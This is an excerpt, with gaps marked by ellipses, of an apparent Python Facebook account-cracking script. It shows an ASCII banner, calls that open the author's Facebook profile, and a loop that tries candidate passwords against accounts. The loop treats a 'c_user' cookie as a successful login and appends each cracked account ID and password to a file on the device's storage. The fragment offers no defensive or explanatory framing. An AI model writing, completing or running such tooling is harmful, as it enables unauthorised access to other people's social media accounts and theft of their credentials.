...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/aadm.tekshesha')
os.system('xdg-open https://www.facebook.com/aadm.tekshesha')
...
\t\x1b[1;97m _   _                 _                 _
 ...
 | . ` |/ _ \ \ /\ / / | |    / _ \ / _ \| |/ /
 | |\  |  __/\ V  V /  | |___| (_) | (_) |   <
 |_| \_|\___| \_/\_/   |______\___/ \___/|_|\_\ 

    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/New-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[NEW ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
